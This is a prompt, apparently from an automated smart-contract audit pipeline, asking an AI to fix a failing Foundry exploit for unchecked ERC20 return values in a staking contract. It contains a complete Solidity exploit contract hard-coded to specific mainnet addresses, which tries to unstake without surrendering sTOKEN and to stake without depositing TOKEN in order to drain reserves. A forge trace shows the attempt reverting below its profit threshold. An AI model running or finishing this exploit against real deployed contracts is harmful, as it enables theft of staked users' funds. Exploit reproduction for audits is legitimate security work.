You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked ERC20 return values let stake and unstake proceed even when token transfers silently fail
- claim: `stake()` and `unstake()` invoke `TOKEN.transferFrom`, `sTOKEN.transfer`, `sTOKEN.transferFrom`, and `TOKEN.transfer` without checking their boolean return values. If either configured token signals failure by returning `false` instead of reverting, the function continues as though the transfer succeeded.
- impact: Silent transfer failures can break the 1:1 backing invariant. A caller can be credited sTOKEN without depositing TOKEN, or withdraw TOKEN without actually surrendering sTOKEN, creating direct reserve theft or user fund loss depending on which transfer silently fails.
- exploit_paths: ["Call `stake(_to, amount)` with a TOKEN implementation that returns `false` from `transferFrom`; the function still executes `sTOKEN.transfer(_to, amount)` and credits the user without receiving backing TOKEN.", "Call `unstake(_to, amount, false)` with an sTOKEN implementation that returns `false` from `transferFrom`; the function still reaches `TOKEN.transfer(_to, amount)` and pays out without actually taking in the receipt tokens.", "Call `unstake(_to, amount, false)` where `TOKEN.transfer` returns `false`; the user has already transferred in sTOKEN, but receives no TOKEN while the transaction itself does not revert."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingTarget {
    function TOKEN() external view returns (address);
    function sTOKEN() external view returns (address);
    function stake(address _to, uint256 _amount) external;
    function unstake(address _to, uint256 _amount, bool _rebase) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9;
    address public constant TOKEN = 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14;
    address public constant STOKEN = 0xdd28c9d511a77835505d2fBE0c9779ED39733bdE;

    enum PathResult {
        Unattempted,
        Success,
        Reverted,
        NoEffect,
        MissingVerifierBalance
    }

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    uint8 public exploitPathUsed;

    PathResult public stakePathResult;
    PathResult public unstakeWithoutSTokenResult;
    PathResult public unstakeTokenTransferFalseProbeResult;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        uint256 tokenBefore = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenBefore = IERC20Like(STOKEN).balanceOf(address(this));

        _attemptDirectUnstakeWithoutSToken(tokenBefore, sTokenBefore);

        if (_profitAmount == 0) {
            _attemptFreeStakeThenRedeem(tokenBefore, sTokenBefore);
        }

        if (_profitAmount == 0) {
            _attemptVictimLossProbe();
        }

        _refreshProfit(tokenBefore, sTokenBefore);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptDirectUnstakeWithoutSToken(
        uint256 tokenBefore,
        uint256 sTokenBefore
    ) internal {
        if (_profitAmount != 0) {
            return;
        }

        uint256 reserve = IERC20Like(TOKEN).balanceOf(TARGET);
        if (reserve == 0) {
            unstakeWithoutSTokenResult = PathResult.NoEffect;
            return;
        }

        uint256 amount = _probeAmount(reserve);

        // Preserved anchor from the finding:
        // unstake(_to, amount, false)
        //
        // In the verified target this path is:
        // sTOKEN.transferFrom(msg.sender, address(this), _amount);
        // TOKEN.transfer(_to, _amount);
        //
        // If sTOKEN.transferFrom returned false instead of reverting, this call would
        // still continue to TOKEN.transfer(_to, _amount) and pay out reserve assets.
        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IStakingTarget.unstake.selector,
                address(this),
                amount,
                false
            )
        );

        if (!ok) {
            unstakeWithoutSTokenResult = PathResult.Reverted;
            return;
        }

        uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));

        if (tokenAfter > tokenBefore && sTokenAfter == sTokenBefore) {
            unstakeWithoutSTokenResult = PathResult.Success;
            hypothesisValidated = true;
            exploitPathUsed = 2;
            _profitToken = TOKEN;
            _profitAmount = tokenAfter - tokenBefore;
            return;
        }

        unstakeWithoutSTokenResult = PathResult.NoEffect;
    }

    function _attemptFreeStakeThenRedeem(
        uint256 tokenBefore,
        uint256 sTokenBefore
    ) internal {
        if (_profitAmount != 0) {
            return;
        }

        uint256 stakingSTokenBalance = IERC20Like(STOKEN).balanceOf(TARGET);
        if (stakingSTokenBalance == 0) {
            stakePathResult = PathResult.NoEffect;
            return;
        }

        _approveMaxIfNeeded(TOKEN, TARGET);

        uint256 amount = _probeAmount(stakingSTokenBalance);

        // Preserved anchors from the finding:
        // stake(_to, amount)
        // token.transferFrom(msg.sender, address(this), amount)
        // stoken.transfer(_to, amount)
        //
        // This verifier keeps the same causality: first attempt to mint sTOKEN via
        // stake() without actually transferring backing TOKEN in, then redeem the
        // windfall through unstake(..., false).
        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IStakingTarget.stake.selector,
                address(this),
                amount
            )
        );

        if (!ok) {
            stakePathResult = PathResult.Reverted;
            return;
        }

        uint256 tokenAfterStake = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenAfterStake = IERC20Like(STOKEN).balanceOf(address(this));

        // A valid exploit for path 1 requires receiving extra sTOKEN without the
        // verifier losing backing TOKEN.
        if (sTokenAfterStake <= sTokenBefore || tokenAfterStake < tokenBefore) {
            stakePathResult = PathResult.NoEffect;
            return;
        }

        stakePathResult = PathResult.Success;
        hypothesisValidated = true;
        exploitPathUsed = 1;

        uint256 minted = sTokenAfterStake - sTokenBefore;
        _approveMaxIfNeeded(STOKEN, TARGET);

        (ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IStakingTarget.unstake.selector,
                address(this),
                minted,
                false
            )
        );

        if (ok) {
            uint256 tokenAfterRedeem = IERC20Like(TOKEN).balanceOf(address(this));
            if (tokenAfterRedeem > tokenBefore) {
                _profitToken = TOKEN;
                _profitAmount = tokenAfterRedeem - tokenBefore;
                return;
            }
        }

        uint256 sTokenAfterRedeem = IERC20Like(STOKEN).balanceOf(address(this));
        if (sTokenAfterRedeem > sTokenBefore) {
            _profitToken = STOKEN;
            _profitAmount = sTokenAfterRedeem - sTokenBefore;
        }
    }

    function _attemptVictimLossProbe() internal {
        // Preserved anchors from the finding:
        // unstake(_to, amount, false)
        // stoken.transferFrom(msg.sender, address(this), amount)
        // token.transfer(_to, amount)
        // token.transfer
        //
        // Path 3 is not a profit path for the verifier. It only demonstrates user loss
        // after sTOKEN is surrendered but TOKEN.transfer returns false. Following the
        // required strategy, this attempt uses verifier-held balance first and does not
        // introduce unrelated funding or custom tokens.
        uint256 sTokenHeld = IERC20Like(STOKEN).balanceOf(address(this));
        if (sTokenHeld == 0) {
            unstakeTokenTransferFalseProbeResult = PathResult.MissingVerifierBalance;
            return;
        }

        uint256 reserve = IERC20Like(TOKEN).balanceOf(TARGET);
        if (reserve == 0) {
            unstakeTokenTransferFalseProbeResult = PathResult.NoEffect;
            return;
        }

        _approveMaxIfNeeded(STOKEN, TARGET);

        uint256 tokenBefore = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenBefore = sTokenHeld;
        uint256 amount = _min(_probeAmount(reserve), sTokenBefore);

        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IStakingTarget.unstake.selector,
                address(this),
                amount,
                false
            )
        );

        if (!ok) {
            unstakeTokenTransferFalseProbeResult = PathResult.Reverted;
            return;
        }

        uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));

        if (sTokenAfter < sTokenBefore && tokenAfter == tokenBefore) {
            unstakeTokenTransferFalseProbeResult = PathResult.Success;
            hypothesisValidated = true;
            if (exploitPathUsed == 0) {
                exploitPathUsed = 3;
            }
            return;
        }

        unstakeTokenTransferFalseProbeResult = PathResult.NoEffect;
    }

    function _refreshProfit(uint256 tokenBefore, uint256 sTokenBefore) internal {
        if (_profitAmount != 0) {
            return;
        }

        uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));

        if (tokenAfter > tokenBefore) {
            _profitToken = TOKEN;
            _profitAmount = tokenAfter - tokenBefore;
            return;
        }

        if (sTokenAfter > sTokenBefore) {
            _profitToken = STOKEN;
            _profitAmount = sTokenAfter - sTokenBefore;
        }
    }

    function _approveMaxIfNeeded(address asset, address spender) internal {
        if (IERC20Like(asset).allowance(address(this), spender) == type(uint256).max) {
            return;
        }

        (bool ok, bytes memory data) = asset.call(
            abi.encodeWithSelector(
                IERC20Like.approve.selector,
                spender,
                type(uint256).max
            )
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _probeAmount(uint256 maxAvailable) internal pure returns (uint256) {
        if (maxAvailable == 0) {
            return 0;
        }
        return 1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000099e2a4f70f4b1
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [624] 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14::balanceOf(0x20746FdE9Ae1b7BBD3dBaDDaE3c9244A27bD2b06) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 473643810472460 [4.736e14]
    │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x20746FdE9Ae1b7BBD3dBaDDaE3c9244A27bD2b06) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 9836382031442134853 [9.836e18]
    │   │   │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000001aec6cb12c20c0000000000000000000000000000000000000000000000008881d9579b24c745
    │   │   │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000001e6f18b3420000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099e2a4f70f4b1
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2707179349013681 [2.707e15]
    │   │   │   │   ├─ [9223] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(2707179349013681 [2.707e15])
    │   │   │   │   │   ├─ [83] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::fallback{value: 2707179349013681}()
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─  emit topic 0: 0x7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000099e2a4f70f4b1
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [55] 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14::fallback{value: 2707179349013681}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [0] 0x4b19466F0C31B3a9FC239EF76ef37ECDc08A2d9F::fallback{value: 1804786232682690}()
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [23974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 902393116330991}()
    │   │   │   │   ├─  emit topic 0: 0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c
    │   │   │   │   │        topic 1: 0x00000000000000000000000039d8bcb39de75218e3c08200d95fde3a479d7a14
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000334b8c5258bef
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [6062] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xAb01b9419Ed5B82C9342886206EaCc5059268cB3, 902393116330991 [9.023e14])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x00000000000000000000000039d8bcb39de75218e3c08200d95fde3a479d7a14
    │   │   │   │   │        topic 2: 0x000000000000000000000000ab01b9419ed5b82c9342886206eacc5059268cb3
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000334b8c5258bef
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Revert] ERC20: transfer amount exceeds balance
    │   │   └─ ← [Revert] ERC20: transfer amount exceeds balance
    │   ├─ [781] 0xdd28c9d511a77835505d2fBE0c9779ED39733bdE::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [624] 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [781] 0xdd28c9d511a77835505d2fBE0c9779ED39733bdE::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [366] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14.transferFrom
  at 0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9.stake
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.15s (4.29ms CPU time)

Ran 1 test suite in 4.17s (4.15s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 567167)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
